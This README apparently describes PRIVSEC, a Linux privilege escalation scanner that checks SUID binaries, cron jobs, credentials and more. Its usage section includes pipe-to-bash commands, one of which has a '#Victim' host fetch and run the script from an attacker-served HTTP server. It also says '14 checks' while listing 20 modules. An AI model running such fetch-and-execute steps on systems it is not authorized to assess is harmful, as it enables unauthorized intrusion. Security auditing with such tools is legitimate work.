
![Project Banner](https://raw.githubusercontent.com/syrusnfs/privsec/main/img/privsec.png)

**Privilege Escalation Security Audit Tool** - Fast, focused Linux privilege escalation scanner with clean output.


[![Version](https://img.shields.io/badge/version-2.0-blue.svg)](https://github.com/syrusnfs/privsec)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Linux-lightgrey.svg)](https://github.com/syrusnfs/privsec)

## Overview

PRIVSEC performs 14 targeted security checks to identify common privilege escalation vectors on Linux systems. Designed for speed and clarity with professional output formatting.

### Key Features

- **14 Security Modules** - SUID/SGID binaries, capabilities, file permissions, cron jobs, systemd services, and more
- **GTFOBins Integration** - 150+ known exploitable binaries database
- **Clean Output** - Color-coded severity levels with statistical summary
- **LinPEAS Integration** - Optional comprehensive enumeration with `--linpeas` flag
- **Lightweight** - ~25KB, runs in 30-60 seconds
- **Zero Dependencies** - Uses only standard Unix utilities

## Usage

```bash
# Direct Use
curl -L https://raw.githubusercontent.com/syrusnfs/privsec/main/privsec.sh | bash

# Download
curl -L https://github.com/syrusnfs/privsec/raw/main/privsec.sh -o privsec.sh

# Set execute
chmod +x privsec.sh

# Options
./privsec.sh -h

# Run 
./privsec.sh

# Run with LinPEAS for comprehensive enumeration
./privsec.sh --linpeas

# Local network
sudo python3 -m http.server $PORT #Host
curl $HOSTIP/privsec.sh | bash #Victim
```

## Severity Levels

| Level | Color | Description |
|-------|------|-------------|
| **CRITICAL** |  Red  | Confirmed exploitation vectors - immediate action required |
| **MEDIUM** |  Yellow  | Potential issues requiring manual validation |
| **INFORMATIONAL** |  Cyan  | Contextual security information |
| **PASS** |  Green  | Security check passed |

## Security Modules

```
0x01 - System Context & Environment
0x02 - SUID Binaries Analysis (GTFOBins)
0x03 - SGID Binaries Analysis
0x04 - Linux Capabilities Audit
0x05 - World-Writable Files
0x06 - World-Writable Directories
0x07 - Critical File Permissions
0x08 - Cron Jobs Security
0x09 - Systemd Services Audit
0x0A - PATH Hijacking Analysis
0x0B - Dynamic Linker Configuration
0x0C - Kernel Vulnerability Assessment
0x0D - Shared Library Security
0x0E - NFS Security Configuration
0x0F - Credential & Configuration Analysis
0x10 - Data Exfiltration Opportunities
0x11 - Group Permission Analysis
0x12 - Filesystem Mount Security
0x13 - SSH Key Management Audit
0x14 - Network Share Configuration
```

## Example Output

![PRIVSEC Output Example](https://raw.githubusercontent.com/syrusnfs/privsec/main/img/output.png)

## PRIVSEC vs LinPEAS

| Feature | PRIVSEC | LinPEAS |
|---------|---------|---------|
| **Scope** | Focused (14 checks) | Comprehensive (100+ checks) |
| **Speed** | 30-60 seconds | 2-5 minutes |
| **Size** | ~25 KB | ~800 KB |
| **Output** | Clean, statistical | Detailed, extensive |
| **Use Case** | Quick audits, reporting | Full enumeration, CTFs |

**Complementary Use:** Run PRIVSEC first for quick overview, then LinPEAS for deep dive.

## Requirements

- Bash shell
- No Root/sudo privileges needed

## Use Cases

**Quick Security Audits** - Fast initial assessment of privilege escalation vectors  
**Penetration Testing** - Identify low-hanging fruit before deeper enumeration  
**Security Reporting** - Clean, professional output for documentation  
**Learning** - Educational tool with clear, readable code  
**CI/CD Integration** - Lightweight scanner for automated security checks  

## Limitations

- Does not perform exploit verification (detection only)
- MEDIUM findings require manual validation
- Kernel vulnerability detection based on version matching
- Cannot access encrypted/restricted content
- Network vectors require active services

## Security Notice

⚠️ **For authorized security assessments only.** Use responsibly and only on systems you own or have explicit permission to audit.

## Contributing

Contributions welcome! Please feel free to submit issues or pull requests.

## Author

**Syrus** - Security Researcher

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation database
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) - LinPEAS integration
- Security research community

---
